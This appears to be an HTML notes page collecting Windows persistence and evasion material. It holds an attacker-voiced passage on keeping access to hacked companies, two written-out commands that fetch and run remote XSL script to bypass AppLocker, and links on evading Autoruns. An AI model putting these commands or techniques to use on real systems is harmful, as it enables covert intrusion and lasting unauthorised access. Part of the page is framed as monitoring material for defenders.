<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Links</title>
</head><body><br/>
Once you have access, you want to keep it. Really, persistence is only a<br/>
challenge for assholes like Hacking Team who target activists and other<br/>
individuals. To hack companies, persistence isn't needed since companies never<br/>
sleep. I always use Duqu 2 style "persistence", executing in RAM on a couple<br/>
high-uptime servers. On the off chance that they all reboot at the same time,<br/>
I have passwords and a golden ticket [1] as backup access. You can read more<br/>
about the different techniques for persistence in windows here [2][3][4]. But<br/>
for hacking companies, it's not needed and it increases the risk of detection.<br/>
<br/>
[1] http://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/<br/>
[2] http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/<br/>
[3] http://www.hexacorn.com/blog/category/autostart-persistence/<br/>
[4] https://blog.netspi.com/tag/persistence/<br/>
<br/>
<br/>
*It is also worth noting that ‘sct’ is not the only player in the game. &nbsp;Here are a few other ‘remote’ XML/XSLT techniques that need to be monitored:<br/>
<br/>
MsXSL [<a href="https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker">Reference</a>]<br/>
<br/>
msxsl.exe http://url/file.xml http://url/file.xsl<br/>
System.Xml.Xsl.XslCompiledTransform Assembly via PowerShell [<a href="https://twitter.com/bohops/status/966172175555284992">Reference</a>]<br/>
<br/>
$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('http://url/file.xsl',$s,$r);$x.Transform('http://url/file.xml','z');del z;<br/>
&nbsp;<br/>
<br/>
<br/>
Complete<br/>
https://github.com/huntresslabs/evading-autoruns<br/>
<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns for Windows</a>&nbsp;&lt;- link to AutoRuns program<br/>
<a href="https://twitter.com/hasherezade/status/849756054145699840">Hasherezade Shell32.dll</a>&nbsp;&lt;- run32 shelldll<br/>
<a href="https://twitter.com/subTee/status/855738126882316288">Casey Smith SyncAppvPublishingServer</a><br/>
<a href="https://twitter.com/monoxgas/status/895417000410861568">Nick Landers SyncAppvPublishingServer on Win7</a><br/>
<a href="https://twitter.com/KyleHanslovan/status/905189665120149506">Kyle Hanslovan SyncAppvPublishingServer Nesting</a><br/>
https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/<br/>
https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/<br/>
</body></html>